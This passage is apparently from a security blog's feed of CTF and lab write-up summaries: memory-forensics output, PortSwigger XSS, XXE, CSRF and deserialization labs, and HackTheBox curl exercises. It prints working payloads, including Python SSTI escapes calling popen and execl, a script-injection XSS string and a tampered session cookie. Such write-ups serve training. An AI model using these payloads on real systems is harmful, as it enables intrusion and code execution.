0xad818ce06240 15 - 0 False 2023-05-21 22:31:27.000000 N/Disabled 4448 824 RuntimeBroker. 0xad818c09a080 9 - 1 False 2023-05-21 22:31:33.000000 N/Disabled 464 3580 SecurityHealth 0xad818979d080 3 - 1 False 2023-05-21 22:31:59.000000 N/Disabled 3252 3580 vmtoolsd.exe 0xad8189796300 8 - 1 False 2023-05-21 22:31:59.000000 N/Disabled 5136 676 SecurityHealth 0xad818d374280 7 - 0 False 2023-05-21 22:32:01.000000 N/Disabled 5328 3580 msedge.exe 0xad818d0980c0 54 - 1 False 2023-05-21 22:32:02.000000 N/Disabled 4396 5328 msedge.exe 0xad818d515080 7 - 1 False 2023-05-21 22:32:19.000000 N/Disabled 1144 5328 msedge.exe 0xad818d75f080 18 - 1 False 2023-05-21 22:32:38.000000 N/Disabled 4544 5328 msedge.exe 0xad818d75b080 14 - 1 False 2023-05-21 22:32:39.000000 N/Disabled 5340 5328 msedge.exe 0xad818d7b3080 10 - 1 False 2023-05-21 22:32:39.000000 N/Disabled 5704 824 RuntimeBroker. 0xad8185962080 5 - 1 False 2023-05-21 22:32:44.000000 N/Disabled 1764 824 dllhost.exe 0xad818d176080 7 - 1 False 2023-05-21 22:32:48.000000 N/Disabled 1916 824 SearchApp.exe 0xad818d099080 24 - 1 False 2023-05-21 22:33:05.000000 N/Disabled 6200 676 SgrmBroker.exe 0xad818d09f080 7 - 0 False 2023-05-21 22:33:42.000000 N/Disabled 6696 676 svchost.exe 0xad818c532080 8 - 0 False 2023-05-21 22:34:07.000000 N/Disabled 7312 824 ApplicationFra 0xad818e84f300 10 - 1 False 2023-05-21 22:35:44.000000 N/Disabled 7772 676 svchost.exe 0xad818e88e140 3 - 0 False 2023-05-21 22:36:03.000000 N/Disabled 6724 3580 Outline.exe 0xad818e578080 0 - 1 True 2023-05-21 22:36:09.000000 2023-05-21 23:01:24.000000 Disabled 4224 6724 Outline.exe 0xad818e88b080 0 - 1 True 2023-05-21 22:36:23.000000 2023-05-21 23:01:24.000000 Disabled 7160 824 SearchApp.exe 0xad818ccc4080 57 - 1 False 2023-05-21 22:39:13.000000 N/Disabled 4628 6724 tun2socks.exe 0xad818de82340 0 - 1 True 2023-05-21 22:40:10.000000 2023-05-21 23:01:24.000000 Disabled 6048 448 taskhostw.exe 0xad818dc5d080 5 - 1 False 2023-05-21 22:40:20.000000 N/Disabled 8264 824 RuntimeBroker. 0xad818eec8080 4 - 1 False 2023-05-21 22:40:33.000000 N/Disabled 3608 676 svchost.exe 0xad818d07a080 3 - 0 False 2023-05-21 22:41:28.000000 N/Disabled 6644 824 SkypeApp.exe 0xad818d3ac080 49 - 1 False 2023-05-21 22:41:52.000000 N/Disabled 5656 824 RuntimeBroker. 0xad81876e8080 0 - 1 False 2023-05-21 21:58:19.000000 2023-05-21 22:02:01.000000 Disabled 8952 824 TextInputHost. 0xad818e6db080 10 - 1 False 2023-05-21 21:59:11.000000 N/Disabled 5808 824 HxTsr.exe 0xad818de5d080 0 - 1 False 2023-05-21 21:59:58.000000 2023-05-21 22:07:45.000000 Disabled 2388 5328 msedge.exe 0xad818e54c340 18 - 1 False 2023-05-21 22:05:35.000000 N/Disabled 6292 5328 msedge.exe 0xad818d7a1080 20 - 1 False 2023-05-21 22:06:15.000000 N/Disabled 3876 448 taskhostw.exe 0xad8189b30080 8 - 1 False 2023-05-21 22:08:02.000000 N/Disabled 372 824 SkypeBackgroun 0xad8186f49080 3 - 1 False 2023-05-21 22:10:00.000000 N/Disabled 1120 676 MsMpEng.exe 0xad818945c080 12 - 0 False 2023-05-21 22:10:01.000000 N/Disabled 6076 824 ShellExperienc 0xad818eb18080 14 - 1 False 2023-05-21 22:11:36.000000 N/Disabled 7336 824 RuntimeBroker. 0xad818e8bb080 2 - 1 False 2023-05-21 22:11:39.000000 N/Disabled 7964 5328 msedge.exe 0xad818dee5080 19 - 1 False 2023-05-21 22:22:09.000000 N/Disabled 6544 5328 msedge.exe 0xad818c0ea080 18 - 1 False 2023-05-21 22:22:35.000000 N/Disabled 5964 676 svchost.exe 0xad818ef86080 5 - 0 False 2023-05-21 22:27:56.000000 N/Disabled 8896 5328 msedge.exe 0xad8187a39080 18 - 1 False 2023-05-21 22:28:21.000000 N/Disabled 5156 5328 msedge.exe 0xad818c553080 14 - 1 False 2023-05-21 22:28:22.000000 N/Disabled 5896 8844 oneetx.exe 0xad8189b41080 5 - 1 True 2023-05-21 22:30:56.000000 N/Disabled 7732 5896 rundll32.exe 0xad818d1912c0 1 - 1 True 2023-05-21 22:31:53.000000 N/Disabled 6324 1496 audiodg.exe 0xad818df2e080 4 - 0 False 2023-05-21 22:42:56.000000 N/Disabled 2228 3580 FTK Imager.exe 0xad818d143080 10 - 1 False 2023-05-21 22:43:56.000000 N/Disabled 5636 3580 notepad.exe 0xad818db45080 1 - 1 False 2023-05-21 22:46:50.000000 N/Disabled 2044 676 svchost.exe 0xad8189b27080 28 - 0 False 2023-05-21 22:49:29.000000 N/Disabled 8708 676 svchost.exe 0xad818d431080 5 - 0 False 2023-05-21 22:57:33.000000 N/Disabled 5476 676 svchost.exe 0xad818e752080 9 - 0 False 2023-05-21 22:58:08.000000 N/Disabled 6596 676 TrustedInstall 0xad818dc88080 4 - 0 False 2023-05-21 22:58:13.000000 N/Disabled 2332 824 TiWorker.exe 0xad818e780080 4 - 0 False 2023-05-21 22:58:13.000000 N/Disabled 4340 676 VSSVC.exe 0xad818e888080 3 - 0 False 2023-05-21 23:01:06.000000 N/Disabled 7540 824 smartscreen.ex 0xad818e893080 14 - 1 False 2023-05-21 23:02:26.000000 N/Disabled 8920 3580 FTK Imager.exe 0xad818ef81080 20 - 1 False 2023-05-21 23:02:28.000000 N/Disabled 5480 448 oneetx.exe 0xad818d3d6080 6 - 1 True 2023-05-21 23:03:00.000000 N/Disabled ::: 方法二: 用malfind排出一些正常的process $ python vol.py -f MemoryDump.mem windows.malfind Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished PID Process Start VPN End VPN Tag Protection CommitCharge PrivateMemory File output Hexdump Disasm 5896 oneetx.exe 0x400000 0x437fff VadS PAGE_EXECUTE_READWRITE 56 1 Disabled 4d 5a 90 00 03 00 00 00 MZ...... 04 00 00 00 ff ff 00 00 ........ b8 00 00 00 00 00 00 00 ........ 40 00 00 00 00 00 00 00 @....... 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 01 00 00 ........ 0x400000: dec ebp 0x400001: pop edx 0x400002: nop 0x400003: add byte ptr [ebx], al 0x400005: add byte ptr [eax], al 0x400007: add byte ptr [eax + eax], al 0x40000a: add byte ptr [eax], al 7540 smartscreen.ex 0x2505c140000 0x2505c15ffff VadS PAGE_EXECUTE_READWRITE 1 1 Disabled 48 89 54 24 10 48 89 4c H.T$.H.L 24 08 4c 89 44 24 18 4c $.L.D$.L 89 4c 24 20 48 8b 41 28 .L$.H.A( 48 8b 48 08 48 8b 51 50 H.H.H.QP 48 83 e2 f8 48 8b ca 48 H...H..H b8 60 00 14 5c 50 02 00 .`..\P.. 00 48 2b c8 48 81 f9 70 .H+.H..p 0f 00 00 76 09 48 c7 c1 ...v.H.. 0x2505c140000: mov qword ptr [rsp + 0x10], rdx 0x2505c140005: mov qword ptr [rsp + 8], rcx 0x2505c14000a: mov qword ptr [rsp + 0x18], r8 0x2505c14000f: mov qword ptr [rsp + 0x20], r9 0x2505c140014: mov rax, qword ptr [rcx + 0x28] 0x2505c140018: mov rcx, qword ptr [rax + 8] 0x2505c14001c: mov rdx, qword ptr [rcx + 0x50] 0x2505c140020: and rdx, 0xfffffffffffffff8 0x2505c140024: mov rcx, rdx 0x2505c140027: movabs rax, 0x2505c140060 0x2505c140031: sub rcx, rax 0x2505c140034: cmp rcx, 0xf70 0x2505c14003b: jbe 0x2505c140046 可以看到oneetx.exe和smartscreen.ex都有進行一些可疑操作，果然oneetx.exe就是答案 :::spoiler Flag Flag: oneetx.exe :::</description></item><item><title>CyberDefender - Spotlight</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/index.html</guid><description>CyberDefender - Spotlight Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/34#nav-questions
:::spoiler TOC [TOC] :::
Tools: Autopsy mac_apt SQLite steghide :::info 因為這一個lab是有關Mac-OS的forensics，也沒有相關的背景知識，所以解出來的部分大多參考12，就是當作第一次學習的課題 :::
==Q1== What version of macOS is running on this image?
Recon 這個是參考1
Exploit 在./root/System/Library/CoreServices/中可以找到SystemVersion.plist :::spoiler Flag Flag: 10.15 :::
==Q2== What “competitive advantage” did Hansel lie about in the file AnotherExample.jpg? (two words)
Exploit 直接翻一下AnotherExample.jpg所在的資料夾，就可以發現有一個secret的text檔案，裡面就有這題的flag，不太知道和這張圖片有甚麼關係 :::info 11/13更新: 直接strings search這張圖片也可以找到secret strings的東西 :::
:::spoiler Flag Flag: flip phone :::</description></item><item><title>CyberDefender - Szechuan Sauce (Part 1)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/index.html</guid><description>CyberDefender - Szechuan Sauce (Part 1) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/31 Part 2: https://hackmd.io/@SBK6401/HkAbt-NXT :::spoiler TOC [TOC] :::
Scenario An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.</description></item><item><title>CyberDefender - Szechuan Sauce (Part 2)</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/index.html</guid><description>CyberDefender - Szechuan Sauce (Part 2) Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/31 Part 1: https://hackmd.io/@SBK6401/rkp952e76
:::spoiler TOC [TOC] :::
Scenario An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.</description></item><item><title>CyberDefender - Tomcat Takeover</title><link>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/index.html</guid><description>CyberDefender - Tomcat Takeover Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions
:::spoiler TOC [TOC] :::
Scenario Our SOC team has detected suspicious activity on one of the web servers within the company’s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.</description></item><item><title>CyberDefender - WebStrike</title><link>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/index.html</guid><description>CyberDefender - WebStrike Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/149
:::spoiler TOC [TOC] :::
Scenario An anomaly was discovered within our company’s intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.
==Q1== Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?</description></item><item><title>DEADFACE CTF 2023</title><link>https://bernie6401.github.io/security/competition/deadface-ctf-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/deadface-ctf-2023/index.html</guid><description>DEADFACE CTF 2023 :::spoiler 比賽成果 :::
Steganography You’ve Been Ransomwared Description DEADFACE is taunting GlitterCo with their latest ransomware attack. According to our intel, the attackers like to leave a calling card in their attacks. If we can figure out which DEADFACE actor executed this attack, we might be able to figure out a way around paying. Can you find anything in this screenshot that might point to which attacker ran this ransomware attack?</description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</guid><description>Deserialization - APPRENTICE tags: Portswigger Web Security Academy Web Lab: Modifying serialized objects Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos’s account. You can log in to your own account using the following credentials: wiener:peter Recon Login First &amp; Recon the package According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below. You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it. Session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d Decoded String: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;} How about Modify the session directly Exp - Change Directly We can use the built-in feature to change our session to admin=1 directly to then send it forward. :::info Each package may contain the session that should be modified. So, pay attention to before sending it forward ::: Delete Carlos :::spoiler Success Screenshot :::</description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/security/competition/eof-ais3-final/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/eof-ais3-final/index.html</guid><description>EOF AIS3 Final tags: CTF AIS3 Reference https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/
https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html
https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md
SSTI: https://www.freebuf.com/articles/network/258136.html https://www.compart.com/en/unicode/U+FF5B https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection
Payload:
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")) print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())) file = 'FLAG.TXT' command = 'EXECL' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()]("/bin/cat", "cat", file.lower())) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())) Script - run_script.py :::spoiler
import subprocess import time import multiprocessing as mp def cycle(i): subprocess.call(['python', 'script.py', '--team', str(i)]) if __name__ == "__main__": p1 = mp.Process(target=cycle, args=('1',)) p2 = mp.Process(target=cycle, args=('2',)) # p3 = mp.Process(target=cycle, args=('3',)) # p4 = mp.Process(target=cycle, args=('4',)) # p5 = mp.Process(target=cycle, args=('5',)) # p7 = mp.Process(target=cycle, args=('7',)) # p8 = mp.Process(target=cycle, args=('8',)) # p9 = mp.Process(target=cycle, args=('9',)) # p10 = mp.Process(target=cycle, args=('10',)) # p11 = mp.Process(target=cycle, args=('11',)) # p12 = mp.Process(target=cycle, args=('12',)) # p13 = mp.Process(target=cycle, args=('13',)) # p14 = mp.Process(target=cycle, args=('14',)) # p15 = mp.Process(target=cycle, args=('15',)) # p16 = mp.Process(target=cycle, args=('16',)) # p17 = mp.Process(target=cycle, args=('17',)) # p18 = mp.Process(target=cycle, args=('18',)) # p19 = mp.Process(target=cycle, args=('19',)) # p20 = mp.Process(target=cycle, args=('20',)) # p21 = mp.Process(target=cycle, args=('21',)) # p22 = mp.Process(target=cycle, args=('22',)) # p23 = mp.Process(target=cycle, args=('23',)) # p24 = mp.Process(target=cycle, args=('24',)) p1.start() time.sleep(2) p2.start() time.sleep(2) # p3.start() # p4.start() # p5.start() # p7.start() # p8.start() # p9.start() # p10.start() # p11.start() # p12.start() # p13.start() # p14.start() # p15.start() # p16.start() # p17.start() # p18.start() # p19.start() # p20.start() # p21.start() # p22.start() # p23.start() # p24.start() p1.join() p2.join() # p3.join() # p4.join() # p5.join() # p7.join() # p8.join() # p9.join() # p10.join() # p11.join() # p12.join() # p13.join() # p14.join() # p15.join() # p16.join() # p17.join() # p18.join() # p19.join() # p20.join() # p21.join() # p22.join() # p23.join() # p24.join() :::</description></item><item><title>HackTheBox</title><link>https://bernie6401.github.io/security/practice/hackthebox/hackthebox/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/hackthebox/hackthebox/index.html</guid><description>HackTheBox [TOC]
Web Requests-GET Background cURL - GET/Header
Exploit $ curl 'http://144.126.206.249:31846/search.php?search=flag' -H 'Authorization: Basic YWRtaW46YWRtaW4=' flag: HTB{curl_g3773r} Web Requests-POST Background cURL - POST/Cookie/Json Data/Header
Exploit $ curl 'http://142.93.47.151:30718/search.php' -b 'PHPSESSID=darsv7lbe3aa22nv4v82h039p6' -X POST -d '{"search":"flag"}' -H 'Content-Type: application/json' ["flag: HTB{p0$t_r3p34t3r}"]% Web Requests-CRUD Background Exploit # Read all the city $ curl -s http://165.232.44.246:31084/api.php/city/ \| jq [{"city_name":"London","country_name":"(UK)"},{"city_name":"Birmingham","country_name":"(UK)"},{"city_name":"Leeds","country_name":"(UK)"},{"city_name":"Glasgow","country_name":"(UK)"},{"city_name":"Sheffield","country_name":"(UK)"}...,{"city_name":"Baltimore","country_name":"(US)"}]% # Update city Baltimore to flag $ curl -X PUT http://165.232.44.246:31084/api.php/city/Baltimore -d '{"city_name":"flag", "country_name":"(US)"}' -H 'Content-Type: application/json' # Delete any city $ curl -X DELETE http://165.232.44.246:31084/api.php/city/Detroit # Read city named flag to get flag $ curl -s http://165.232.44.246:32034/api.php/city/ \| jqcurl -s http://165.232.44.246:31084/api.php/city/flag [{"city_name":"flag","country_name":"HTB{crud_4p!_m4n!pul4t0r}"}]% JavaScript Deobfuscation-Decoding Exploit Use CypherChef First to decode N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz</description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</guid><description>Lab: Arbitrary object injection in PHP tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. Constructor &amp; Deconstructor Python建構函式與解構函式（init()和__del__()） 其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已 而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量</description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</guid><description>Lab: Blind XXE with out-of-band interaction tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: Background 有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：</description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</guid><description>Lab: Blind XXE with out-of-band interaction via XML parameter entities tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server. Background 這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果</description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</guid><description>Lab: CSRF where token is not tied to user session tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya Background CSRF token should tied to user session otherwise, it’ll exploited by attacker.</description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</guid><description>Lab: CSRF where token is tied to non-session cookie tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.
Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya</description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</guid><description>Lab: CSRF where token validation depends on request method tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below: We can notice that the carried data including csrf_token</description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</guid><description>Lab: CSRF where token validation depends on token being present tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package It’s very similar with previous lab $\to$ it contained CSRF_token as its carried data:</description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</guid><description>Lab: DOM XSS in document.write sink using source location.search inside a select element tags: Portswigger Web Security Academy Web Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. Recon Find the injection place I used string search to find location.search in each sub-page source. Here is the interesting code: :::spoiler Source Code ... &lt;script> var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('&lt;select name="storeId">'); if(store) { document.write('&lt;option selected>'+store+'&lt;/option>'); } for(var i=0;i&lt;stores.length;i++) { if(stores[i] === store) { continue; } document.write('&lt;option>'+stores[i]+'&lt;/option>'); } document.write('&lt;/select>'); &lt;/script> ... ::: Try type something about storeID as URL GET parameter Payload: /product?productId=1&amp;storeId=abc You can see that this is a perfect injection place Exp Payload: /product?productId=1&amp;storeId=&lt;script>alert(123);&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</guid><description>Lab: Exploiting XInclude to retrieve files tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. Goal: To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn’t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. Background XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document</description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</guid><description>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: 